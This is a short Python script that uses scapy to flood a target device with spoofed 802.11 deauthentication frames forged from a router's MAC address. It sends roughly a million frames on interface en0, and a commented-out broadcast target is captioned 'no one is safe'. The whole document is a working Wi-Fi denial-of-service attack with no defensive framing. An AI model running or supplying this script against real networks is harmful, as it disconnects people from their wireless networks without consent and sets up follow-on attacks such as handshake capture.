from scapy.all import *

gatewaymac = "84:94:8c:cc:73:62"
#this address is router's mac address

# target="ff:ff:ff:ff:ff:ff"
# no one is safe
target = "b2:17:f0:c5:17:74"

# 802.11 frame
# addr1: destination MAC
# addr2: source MAC
# addr3: Access Point MAC
dot11 = Dot11(addr1=target, addr2=gatewaymac, addr3=gatewaymac)
# stack them up
packet = RadioTap()/dot11/Dot11Deauth(reason=7)
# send the packet
i=100000
while(i):
    print("sending request to mac:- "+ gatewaymac)
    sendp(packet, inter=0.1, count=10, iface="en0", verbose=1)
    i=i-1